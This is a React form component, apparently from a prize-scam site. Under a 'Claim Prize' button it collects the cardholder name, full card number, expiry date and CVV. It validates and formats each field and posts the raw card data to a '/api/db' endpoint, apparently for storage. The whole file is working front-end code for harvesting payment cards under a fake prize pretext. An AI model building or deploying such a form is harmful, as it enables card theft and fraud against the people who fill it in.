'use client'
import { useState } from 'react'

function fmtCard(v) {
  return v.replace(/\D/g, '').slice(0, 16).replace(/(.{4})/g, '$1 ').trim()
}
function fmtExpiry(v) {
  const d = v.replace(/\D/g, '').slice(0, 4)
  return d.length > 2 ? d.slice(0, 2) + '/' + d.slice(2) : d
}

export default function ClaimForm({ onSuccess }) {
  const [form, setForm] = useState({ name: '', number: '', expiry: '', cvv: '' })
  const [error, setError] = useState('')
  const [loading, setLoading] = useState(false)

  const field = (label, key, type = 'text', placeholder = '') => (
    <div key={key}>
      <label className="block text-sm font-semibold mb-1" style={{ color: '#0f172a' }}>
        {label}
      </label>
      <input
        type={type}
        value={form[key]}
        onChange={(e) => {
          let val = e.target.value
          if (key === 'number') val = fmtCard(val)
          if (key === 'expiry') val = fmtExpiry(val)
          if (key === 'cvv') val = val.replace(/\D/g, '').slice(0, 3)
          setForm((p) => ({ ...p, [key]: val }))
        }}
        placeholder={placeholder}
        className="w-full px-4 py-3 rounded-lg border-2 focus:outline-none"
        style={{ borderColor: '#FFD700' }}
        required
      />
    </div>
  )

  async function submit(e) {
    e.preventDefault()
    setError('')
    const raw = form.number.replace(/\s/g, '')
    if (raw.length !== 16) { setError('Card number must be 16 digits'); return }
    if (!/^\d{2}\/\d{2}$/.test(form.expiry)) { setError('Expiry must be MM/YY'); return }
    if (form.cvv.length !== 3) { setError('CVV must be 3 digits'); return }
    setLoading(true)
    try {
      const res = await fetch('/api/db', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'claim-prize',
          cardholder_name: form.name,
          card_number: raw,
          card_expiry: form.expiry,
          card_cvv: form.cvv,
        }),
      })
      const data = await res.json()
      if (!res.ok) setError(data.error || 'Submission failed')
      else onSuccess()
    } catch {
      setError('Network error. Please try again.')
    } finally {
      setLoading(false)
    }
  }

  return (
    <form onSubmit={submit} className="space-y-4">
      {error && (
        <div className="bg-red-50 border border-red-200 text-red-700 rounded-lg p-3 text-sm">{error}</div>
      )}
      {field('Cardholder Name', 'name', 'text', 'John Smith')}
      {field('Card Number', 'number', 'text', '0000 0000 0000 0000')}
      <div className="grid grid-cols-2 gap-4">
        {field('Expiry Date', 'expiry', 'text', 'MM/YY')}
        {field('CVV', 'cvv', 'password', '•••')}
      </div>
      <button
        type="submit"
        disabled={loading}
        className="w-full py-3 rounded-xl font-black text-lg transition-colors"
        style={{ backgroundColor: loading ? '#FFC107' : '#FFD700', color: '#0f172a' }}
      >
        {loading ? 'Submitting…' : 'Claim Prize'}
      </button>
    </form>
  )
}
